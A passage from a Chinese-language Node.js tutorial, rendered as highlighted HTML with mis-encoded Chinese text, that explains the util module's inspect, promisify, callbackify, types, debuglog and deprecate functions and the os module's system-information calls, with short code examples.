  <span class="hljs-attr">nested</span>: {
    <span class="hljs-attr">city</span>: <span class="hljs-string">'NYC'</span>,
    <span class="hljs-attr">hobbies</span>: [<span class="hljs-string">'coding'</span>, <span class="hljs-string">'reading'</span>]
  }
};

<span class="hljs-comment">// åŸºæœ¬ç”¨æ³•</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(util.<span class="hljs-title function_">inspect</span>(obj));
<span class="hljs-comment">// è¾“å‡º: { name: 'John', age: 30, nested: { city: 'NYC', hobbies: [ 'coding', 'reading' ] } }</span>

<span class="hljs-comment">// é€‰é¡¹é…ç½®</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(util.<span class="hljs-title function_">inspect</span>(obj, {
  <span class="hljs-attr">colors</span>: <span class="hljs-literal">true</span>,        <span class="hljs-comment">// ä½¿ç”¨é¢œè‰²</span>
  <span class="hljs-attr">depth</span>: <span class="hljs-number">2</span>,           <span class="hljs-comment">// æœ€å¤§é€’å½’æ·±åº¦</span>
  <span class="hljs-attr">compact</span>: <span class="hljs-literal">false</span>,     <span class="hljs-comment">// æ¯ä¸ªå±æ€§ä¸€è¡Œ</span>
  <span class="hljs-attr">showHidden</span>: <span class="hljs-literal">true</span>,   <span class="hljs-comment">// æ˜¾ç¤ºä¸å¯æšä¸¾å±æ€§</span>
  <span class="hljs-attr">breakLength</span>: <span class="hljs-number">80</span>     <span class="hljs-comment">// æ¢è¡Œé•¿åº¦</span>
}));

<span class="hljs-comment">// è‡ªå®šä¹‰ inspect æ–¹æ³•</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">CustomObject</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">value</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">value</span> = value;
  }
  
  [util.<span class="hljs-property">inspect</span>.<span class="hljs-property">custom</span>]() {
    <span class="hljs-keyword">return</span> <span class="hljs-string">`CustomObject(<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.value}</span>)`</span>;
  }
}

<span class="hljs-keyword">const</span> custom = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CustomObject</span>(<span class="hljs-number">42</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(util.<span class="hljs-title function_">inspect</span>(custom));
<span class="hljs-comment">// è¾“å‡º: 'CustomObject(42)'</span>
</code></pre>
<h4 data-id="heading-36"><code>util.promisify(original)</code> - Promise åŒ–</h4>
<p>å°†éµå¾ªé”™è¯¯ä¼˜å…ˆå›è°ƒé£æ ¼çš„å‡½æ•°è½¬æ¢ä¸ºè¿”å› Promise çš„å‡½æ•°ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> util = <span class="hljs-built_in">require</span>(<span class="hljs-string">'util'</span>);
<span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">'fs'</span>);

<span class="hljs-comment">// å°†å›è°ƒå‡½æ•°è½¬æ¢ä¸º Promise</span>
<span class="hljs-keyword">const</span> readFile = util.<span class="hljs-title function_">promisify</span>(fs.<span class="hljs-property">readFile</span>);
<span class="hljs-keyword">const</span> writeFile = util.<span class="hljs-title function_">promisify</span>(fs.<span class="hljs-property">writeFile</span>);

<span class="hljs-comment">// ä½¿ç”¨ async/await</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">readConfig</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> <span class="hljs-title function_">readFile</span>(<span class="hljs-string">'config.json'</span>, <span class="hljs-string">'utf8'</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(data);
  } <span class="hljs-keyword">catch</span> (error) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'è¯»å–æ–‡ä»¶å¤±è´¥:'</span>, error);
    <span class="hljs-keyword">throw</span> error;
  }
}

<span class="hljs-comment">// ä½¿ç”¨ .then()</span>
<span class="hljs-title function_">readFile</span>(<span class="hljs-string">'data.txt'</span>, <span class="hljs-string">'utf8'</span>)
  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data))
  .<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">err</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(err));

<span class="hljs-comment">// è‡ªå®šä¹‰ Promise åŒ–å‡½æ•°</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">customFunction</span>(<span class="hljs-params">arg, callback</span>) {
  <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">if</span> (arg &gt; <span class="hljs-number">0</span>) {
      <span class="hljs-title function_">callback</span>(<span class="hljs-literal">null</span>, arg * <span class="hljs-number">2</span>);
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-title function_">callback</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'å‚æ•°å¿…é¡»å¤§äº0'</span>));
    }
  }, <span class="hljs-number">100</span>);
}

<span class="hljs-keyword">const</span> promisifiedCustom = util.<span class="hljs-title function_">promisify</span>(customFunction);

<span class="hljs-title function_">promisifiedCustom</span>(<span class="hljs-number">5</span>)
  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">result</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(result))  <span class="hljs-comment">// è¾“å‡º: 10</span>
  .<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">err</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(err));
</code></pre>
<h4 data-id="heading-37"><code>util.callbackify(original)</code> - å›è°ƒåŒ–</h4>
<p>ä¸ <code>promisify</code> ç›¸åï¼Œå°†è¿”å› Promise çš„å‡½æ•°è½¬æ¢ä¸ºä½¿ç”¨å›è°ƒçš„å‡½æ•°ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> util = <span class="hljs-built_in">require</span>(<span class="hljs-string">'util'</span>);
<span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">'fs'</span>).<span class="hljs-property">promises</span>;

<span class="hljs-comment">// å°† Promise å‡½æ•°è½¬æ¢ä¸ºå›è°ƒå‡½æ•°</span>
<span class="hljs-keyword">const</span> readFileCallback = util.<span class="hljs-title function_">callbackify</span>(fs.<span class="hljs-property">readFile</span>);

<span class="hljs-title function_">readFileCallback</span>(<span class="hljs-string">'file.txt'</span>, <span class="hljs-string">'utf8'</span>, <span class="hljs-function">(<span class="hljs-params">err, data</span>) =&gt;</span> {
  <span class="hljs-keyword">if</span> (err) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'é”™è¯¯:'</span>, err);
    <span class="hljs-keyword">return</span>;
  }
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'æ•°æ®:'</span>, data);
});
</code></pre>
<h4 data-id="heading-38"><code>util.types</code> - ç±»å‹æ£€æŸ¥</h4>
<p>æä¾›å„ç§ç±»å‹æ£€æŸ¥å‡½æ•°ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> util = <span class="hljs-built_in">require</span>(<span class="hljs-string">'util'</span>);

<span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦ä¸ºæ•°ç»„</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(util.<span class="hljs-property">types</span>.<span class="hljs-title function_">isArrayBuffer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>()));  <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(util.<span class="hljs-property">types</span>.<span class="hljs-title function_">isArrayBuffer</span>([]));                 <span class="hljs-comment">// false</span>

<span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦ä¸º Date å¯¹è±¡</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(util.<span class="hljs-property">types</span>.<span class="hljs-title function_">isDate</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>()));                <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(util.<span class="hljs-property">types</span>.<span class="hljs-title function_">isDate</span>(<span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>()));                <span class="hljs-comment">// false</span>

<span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦ä¸º Map</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(util.<span class="hljs-property">types</span>.<span class="hljs-title function_">isMap</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>()));                  <span class="hljs-comment">// true</span>

<span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦ä¸º Set</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(util.<span class="hljs-property">types</span>.<span class="hljs-title function_">isSet</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>()));                  <span class="hljs-comment">// true</span>

<span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦ä¸º Promise</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(util.<span class="hljs-property">types</span>.<span class="hljs-title function_">isPromise</span>(<span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>()));     <span class="hljs-comment">// true</span>

<span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦ä¸º RegExp</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(util.<span class="hljs-property">types</span>.<span class="hljs-title function_">isRegExp</span>(<span class="hljs-regexp">/abc/</span>));                   <span class="hljs-comment">// true</span>

<span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦ä¸º String å¯¹è±¡</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(util.<span class="hljs-property">types</span>.<span class="hljs-title function_">isStringObject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">'foo'</span>))); <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(util.<span class="hljs-property">types</span>.<span class="hljs-title function_">isStringObject</span>(<span class="hljs-string">'foo'</span>));             <span class="hljs-comment">// false</span>
</code></pre>
<h4 data-id="heading-39"><code>util.debuglog(section)</code> - è°ƒè¯•æ—¥å¿—</h4>
<p>åˆ›å»ºä¸€ä¸ªè°ƒè¯•æ—¥å¿—å‡½æ•°ï¼Œä»…åœ¨è®¾ç½®äº† <code>NODE_DEBUG</code> ç¯å¢ƒå˜é‡æ—¶æ‰ä¼šè¾“å‡ºæ—¥å¿—ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> util = <span class="hljs-built_in">require</span>(<span class="hljs-string">'util'</span>);

<span class="hljs-keyword">const</span> debuglog = util.<span class="hljs-title function_">debuglog</span>(<span class="hljs-string">'foo'</span>);

<span class="hljs-comment">// è®¾ç½®ç¯å¢ƒå˜é‡: NODE_DEBUG=foo node app.js</span>
<span class="hljs-title function_">debuglog</span>(<span class="hljs-string">'Hello from foo [%d]'</span>, <span class="hljs-number">123</span>);
<span class="hljs-comment">// åªæœ‰åœ¨è®¾ç½®äº† NODE_DEBUG=foo æ—¶æ‰ä¼šè¾“å‡º</span>

<span class="hljs-comment">// å¤šä¸ªè°ƒè¯•æ ‡ç­¾</span>
<span class="hljs-keyword">const</span> debug1 = util.<span class="hljs-title function_">debuglog</span>(<span class="hljs-string">'foo'</span>);
<span class="hljs-keyword">const</span> debug2 = util.<span class="hljs-title function_">debuglog</span>(<span class="hljs-string">'bar'</span>);

<span class="hljs-title function_">debug1</span>(<span class="hljs-string">'è¿™æ˜¯ foo çš„è°ƒè¯•ä¿¡æ¯'</span>);
<span class="hljs-title function_">debug2</span>(<span class="hljs-string">'è¿™æ˜¯ bar çš„è°ƒè¯•ä¿¡æ¯'</span>);

<span class="hljs-comment">// è¿è¡Œ: NODE_DEBUG=foo,bar node app.js</span>
</code></pre>
<h4 data-id="heading-40"><code>util.deprecate(fn, msg[, code])</code> - æ ‡è®°ä¸ºå¼ƒç”¨</h4>
<p>æ ‡è®°å‡½æ•°ä¸ºå·²å¼ƒç”¨ï¼Œè°ƒç”¨æ—¶ä¼šæ˜¾ç¤ºè­¦å‘Šä¿¡æ¯ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> util = <span class="hljs-built_in">require</span>(<span class="hljs-string">'util'</span>);

<span class="hljs-keyword">const</span> deprecatedFunction = util.<span class="hljs-title function_">deprecate</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'è¿™ä¸ªå‡½æ•°å·²è¢«å¼ƒç”¨'</span>);
}, <span class="hljs-string">'deprecatedFunction() å·²å¼ƒç”¨ï¼Œè¯·ä½¿ç”¨ newFunction() ä»£æ›¿'</span>);

<span class="hljs-title function_">deprecatedFunction</span>();
<span class="hljs-comment">// è¾“å‡ºè­¦å‘Š: (node:12345) DeprecationWarning: deprecatedFunction() å·²å¼ƒç”¨ï¼Œè¯·ä½¿ç”¨ newFunction() ä»£æ›¿</span>
</code></pre>
<h3 data-id="heading-41">4.3 å®ç”¨ç¤ºä¾‹</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> util = <span class="hljs-built_in">require</span>(<span class="hljs-string">'util'</span>);
<span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">'fs'</span>);

<span class="hljs-comment">// ç¤ºä¾‹1ï¼šæ·±åº¦å…‹éš†å¯¹è±¡ï¼ˆä½¿ç”¨ JSON åºåˆ—åŒ–ï¼Œæœ‰å±€é™æ€§ï¼‰</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">deepClone</span>(<span class="hljs-params">obj</span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(obj));
}
<span class="hljs-comment">// æ³¨æ„ï¼šæ­¤æ–¹æ³•æ— æ³•å…‹éš†å‡½æ•°ã€undefinedã€Symbolã€Date å¯¹è±¡ç­‰</span>
<span class="hljs-comment">// æ›´å¥½çš„æ–¹å¼ï¼šä½¿ç”¨ç»“æ„åŒ–å…‹éš†ï¼ˆNode.js 17+ï¼‰æˆ–åº“å¦‚ lodash.cloneDeep</span>

<span class="hljs-comment">// ç¤ºä¾‹2ï¼šæ ¼å¼åŒ–é”™è¯¯å¯¹è±¡</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">formatError</span>(<span class="hljs-params">error</span>) {
  <span class="hljs-keyword">return</span> util.<span class="hljs-title function_">inspect</span>(error, {
    <span class="hljs-attr">colors</span>: <span class="hljs-literal">true</span>,
    <span class="hljs-attr">depth</span>: <span class="hljs-literal">null</span>
  });
}

<span class="hljs-keyword">try</span> {
  <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'Something went wrong'</span>);
} <span class="hljs-keyword">catch</span> (err) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">formatError</span>(err));
}

<span class="hljs-comment">// ç¤ºä¾‹3ï¼šæ‰¹é‡ Promise åŒ–</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">promisifyAll</span>(<span class="hljs-params">obj</span>) {
  <span class="hljs-keyword">const</span> promisified = {};
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> key <span class="hljs-keyword">in</span> obj) {
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> obj[key] === <span class="hljs-string">'function'</span>) {
      promisified[key] = util.<span class="hljs-title function_">promisify</span>(obj[key].<span class="hljs-title function_">bind</span>(obj));
    }
  }
  <span class="hljs-keyword">return</span> promisified;
}

<span class="hljs-keyword">const</span> fsPromises = <span class="hljs-title function_">promisifyAll</span>(fs);
<span class="hljs-comment">// ç°åœ¨å¯ä»¥ä½¿ç”¨ fsPromises.readFile, fsPromises.writeFile ç­‰</span>

<span class="hljs-comment">// ç¤ºä¾‹4ï¼šåˆ›å»ºè°ƒè¯•å·¥å…·</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">createDebugger</span>(<span class="hljs-params">namespace</span>) {
  <span class="hljs-keyword">const</span> debug = util.<span class="hljs-title function_">debuglog</span>(namespace);
  <span class="hljs-keyword">return</span> {
    <span class="hljs-attr">log</span>: <span class="hljs-function">(<span class="hljs-params">...args</span>) =&gt;</span> <span class="hljs-title function_">debug</span>(util.<span class="hljs-title function_">format</span>(...args)),
    <span class="hljs-attr">info</span>: <span class="hljs-function">(<span class="hljs-params">...args</span>) =&gt;</span> <span class="hljs-title function_">debug</span>(<span class="hljs-string">`[INFO] <span class="hljs-subst">${util.format(...args)}</span>`</span>),
    <span class="hljs-attr">error</span>: <span class="hljs-function">(<span class="hljs-params">...args</span>) =&gt;</span> <span class="hljs-title function_">debug</span>(<span class="hljs-string">`[ERROR] <span class="hljs-subst">${util.format(...args)}</span>`</span>)
  };
}

<span class="hljs-keyword">const</span> logger = <span class="hljs-title function_">createDebugger</span>(<span class="hljs-string">'app'</span>);
<span class="hljs-comment">// è¿è¡Œ: NODE_DEBUG=app node app.js</span>
logger.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Application started'</span>);
logger.<span class="hljs-title function_">info</span>(<span class="hljs-string">'Processing request'</span>);
logger.<span class="hljs-title function_">error</span>(<span class="hljs-string">'An error occurred'</span>);
</code></pre>
<hr/>
<h2 data-id="heading-42">äº”ã€os æ¨¡å—ï¼šæ“ä½œç³»ç»Ÿä¿¡æ¯</h2>
<p><code>os</code> æ¨¡å—æä¾›äº†ä¸æ“ä½œç³»ç»Ÿç›¸å…³çš„ä¿¡æ¯å’Œæ–¹æ³•ï¼Œå…è®¸å¼€å‘è€…è·å–ç³»ç»Ÿæ¶æ„ã€å¹³å°ã€CPU ä¿¡æ¯ã€å†…å­˜ä½¿ç”¨æƒ…å†µã€ç½‘ç»œæ¥å£ç­‰ã€‚</p>
<h3 data-id="heading-43">5.1 å¼•å…¥æ¨¡å—</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> os = <span class="hljs-built_in">require</span>(<span class="hljs-string">'os'</span>);
</code></pre>
<h3 data-id="heading-44">5.2 å¸¸ç”¨æ–¹æ³•å’Œå±æ€§</h3>
<h4 data-id="heading-45"><code>os.platform()</code> - è·å–æ“ä½œç³»ç»Ÿå¹³å°</h4>
<p>è¿”å›æ“ä½œç³»ç»Ÿå¹³å°æ ‡è¯†ç¬¦ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> os = <span class="hljs-built_in">require</span>(<span class="hljs-string">'os'</span>);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(os.<span class="hljs-title function_">platform</span>());
<span class="hljs-comment">// å¯èƒ½çš„å€¼:</span>
<span class="hljs-comment">// 'darwin' - macOS</span>
<span class="hljs-comment">// 'win32' - Windows</span>
<span class="hljs-comment">// 'linux' - Linux</span>
<span class="hljs-comment">// 'freebsd' - FreeBSD</span>
<span class="hljs-comment">// 'openbsd' - OpenBSD</span>
</code></pre>
<h4 data-id="heading-46"><code>os.arch()</code> - è·å– CPU æ¶æ„</h4>
<p>è¿”å›æ“ä½œç³»ç»Ÿçš„ CPU æ¶æ„ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> os = <span class="hljs-built_in">require</span>(<span class="hljs-string">'os'</span>);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(os.<span class="hljs-title function_">arch</span>());
<span class="hljs-comment">// å¯èƒ½çš„å€¼:</span>
<span class="hljs-comment">// 'x64' - 64ä½</span>
<span class="hljs-comment">// 'arm' - ARM</span>
<span class="hljs-comment">// 'arm64' - ARM 64ä½</span>
<span class="hljs-comment">// 'ia32' - 32ä½</span>
</code></pre>
<h4 data-id="heading-47"><code>os.cpus()</code> - è·å– CPU ä¿¡æ¯</h4>
<p>è¿”å›æ¯ä¸ªé€»è¾‘ CPU å†…æ ¸çš„ä¿¡æ¯æ•°ç»„ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> os = <span class="hljs-built_in">require</span>(<span class="hljs-string">'os'</span>);

<span class="hljs-keyword">const</span> cpus = os.<span class="hljs-title function_">cpus</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`CPU æ ¸å¿ƒæ•°: <span class="hljs-subst">${cpus.length}</span>`</span>);

cpus.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">cpu, index</span>) =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`CPU <span class="hljs-subst">${index}</span>:`</span>);
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`  å‹å·: <span class="hljs-subst">${cpu.model}</span>`</span>);
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`  é€Ÿåº¦: <span class="hljs-subst">${cpu.speed}</span> MHz`</span>);
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`  ç”¨æˆ·æ—¶é—´: <span class="hljs-subst">${cpu.times.user}</span> ms`</span>);
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`  ç³»ç»Ÿæ—¶é—´: <span class="hljs-subst">${cpu.times.sys}</span> ms`</span>);
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`  ç©ºé—²æ—¶é—´: <span class="hljs-subst">${cpu.times.idle}</span> ms`</span>);
});

<span class="hljs-comment">// è®¡ç®— CPU ä½¿ç”¨ç‡</span>
<span class="hljs-comment">// æ³¨æ„ï¼šæ­¤å‡½æ•°ä»…ç”¨äºæ¼”ç¤ºåŸºæœ¬æ¦‚å¿µã€‚å®é™…åº”ç”¨ä¸­ï¼ŒCPU ä½¿ç”¨ç‡éœ€è¦é€šè¿‡ä¸¤æ¬¡é‡‡æ ·ï¼ˆé—´éš”ä¸€æ®µæ—¶é—´ï¼‰æ¥è®¡ç®—å·®å€¼æ‰èƒ½å¾—åˆ°å‡†ç¡®ç»“æœ</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">getCPUUsage</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> cpus = os.<span class="hljs-title function_">cpus</span>();
  <span class="hljs-keyword">let</span> totalIdle = <span class="hljs-number">0</span>;
  <span class="hljs-keyword">let</span> totalTick = <span class="hljs-number">0</span>;
  
  cpus.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">cpu</span> =&gt;</span> {
    <span class="hljs-keyword">const</span> times = cpu.<span class="hljs-property">times</span>;
    totalIdle += times.<span class="hljs-property">idle</span>;
    totalTick += times.<span class="hljs-property">user</span> + times.<span class="hljs-property">nice</span> + times.<span class="hljs-property">sys</span> + times.<span class="hljs-property">idle</span> + times.<span class="hljs-property">irq</span>;
  });
  
  <span class="hljs-keyword">const</span> idle = totalIdle / cpus.<span class="hljs-property">length</span>;
  <span class="hljs-keyword">const</span> total = totalTick / cpus.<span class="hljs-property">length</span>;
  <span class="hljs-keyword">const</span> usage = <span class="hljs-number">100</span> - ~~(<span class="hljs-number">100</span> * idle / total);
  
  <span class="hljs-keyword">return</span> usage;
}
</code></pre>
<h4 data-id="heading-48"><code>os.totalmem()</code> - è·å–æ€»å†…å­˜</h4>
<p>è¿”å›ç³»ç»Ÿçš„æ€»å†…å­˜é‡ï¼ˆä»¥å­—èŠ‚ä¸ºå•ä½ï¼‰ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> os = <span class="hljs-built_in">require</span>(<span class="hljs-string">'os'</span>);

<span class="hljs-keyword">const</span> totalMem = os.<span class="hljs-title function_">totalmem</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`æ€»å†…å­˜: <span class="hljs-subst">${(totalMem / <span class="hljs-number">1024</span> / <span class="hljs-number">1024</span> / <span class="hljs-number">1024</span>).toFixed(<span class="hljs-number">2</span>)}</span> GB`</span>);
</code></pre>
<h4 data-id="heading-49"><code>os.freemem()</code> - è·å–ç©ºé—²å†…å­˜</h4>
<p>è¿”å›ç³»ç»Ÿçš„ç©ºé—²å†…å­˜é‡ï¼ˆä»¥å­—èŠ‚ä¸ºå•ä½ï¼‰ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> os = <span class="hljs-built_in">require</span>(<span class="hljs-string">'os'</span>);

<span class="hljs-keyword">const</span> freeMem = os.<span class="hljs-title function_">freemem</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`ç©ºé—²å†…å­˜: <span class="hljs-subst">${(freeMem / <span class="hljs-number">1024</span> / <span class="hljs-number">1024</span> / <span class="hljs-number">1024</span>).toFixed(<span class="hljs-number">2</span>)}</span> GB`</span>);

<span class="hljs-comment">// è®¡ç®—å†…å­˜ä½¿ç”¨ç‡</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">getMemoryUsage</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> total = os.<span class="hljs-title function_">totalmem</span>();
  <span class="hljs-keyword">const</span> free = os.<span class="hljs-title function_">freemem</span>();
  <span class="hljs-keyword">const</span> used = total - free;
  <span class="hljs-keyword">const</span> usagePercent = (used / total * <span class="hljs-number">100</span>).<span class="hljs-title function_">toFixed</span>(<span class="hljs-number">2</span>);
  
  <span class="hljs-keyword">return</span> {
    <span class="hljs-attr">total</span>: <span class="hljs-title function_">formatBytes</span>(total),
    <span class="hljs-attr">used</span>: <span class="hljs-title function_">formatBytes</span>(used),
    <span class="hljs-attr">free</span>: <span class="hljs-title function_">formatBytes</span>(free),
    <span class="hljs-attr">usagePercent</span>: <span class="hljs-string">`<span class="hljs-subst">${usagePercent}</span>%`</span>
  };
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">formatBytes</span>(<span class="hljs-params">bytes</span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-string">`<span class="hljs-subst">${(bytes / <span class="hljs-number">1024</span> / <span class="hljs-number">1024</span> / <span class="hljs-number">1024</span>).toFixed(<span class="hljs-number">2</span>)}</span> GB`</span>;
}
</code></pre>
<h4 data-id="heading-50"><code>os.hostname()</code> - è·å–ä¸»æœºå</h4>
<p>è¿”å›æ“ä½œç³»ç»Ÿçš„ä¸»æœºåã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> os = <span class="hljs-built_in">require</span>(<span class="hljs-string">'os'</span>);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(os.<span class="hljs-title function_">hostname</span>());
<span class="hljs-comment">// è¾“å‡º: 'my-computer'</span>
</code></pre>
<h4 data-id="heading-51"><code>os.type()</code> - è·å–æ“ä½œç³»ç»Ÿç±»å‹</h4>
<p>è¿”å›æ“ä½œç³»ç»Ÿçš„ç±»å‹ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> os = <span class="hljs-built_in">require</span>(<span class="hljs-string">'os'</span>);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(os.<span class="hljs-title function_">type</span>());
<span class="hljs-comment">// å¯èƒ½çš„å€¼:</span>
<span class="hljs-comment">// 'Linux' - Linux</span>
<span class="hljs-comment">// 'Darwin' - macOS</span>
<span class="hljs-comment">// 'Windows_NT' - Windows</span>
</code></pre>
<h4 data-id="heading-52"><code>os.release()</code> - è·å–æ“ä½œç³»ç»Ÿç‰ˆæœ¬</h4>
<p>è¿”å›æ“ä½œç³»ç»Ÿçš„ç‰ˆæœ¬å·ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> os = <span class="hljs-built_in">require</span>(<span class="hljs-string">'os'</span>);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(os.<span class="hljs-title function_">release</span>());
<span class="hljs-comment">// è¾“å‡º: '5.4.0-74-generic' (Linux)</span>
<span class="hljs-comment">// æˆ–: '20.6.0' (macOS)</span>
<span class="hljs-comment">// æˆ–: '10.0.19043' (Windows)</span>
</code></pre>
<h4 data-id="heading-53"><code>os.uptime()</code> - è·å–ç³»ç»Ÿè¿è¡Œæ—¶é—´</h4>
<p>è¿”å›ç³»ç»Ÿçš„è¿è¡Œæ—¶é—´ï¼ˆä»¥ç§’ä¸ºå•ä½ï¼‰ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> os = <span class="hljs-built_in">require</span>(<span class="hljs-string">'os'</span>);

<span class="hljs-keyword">const</span> uptime = os.<span class="hljs-title function_">uptime</span>();
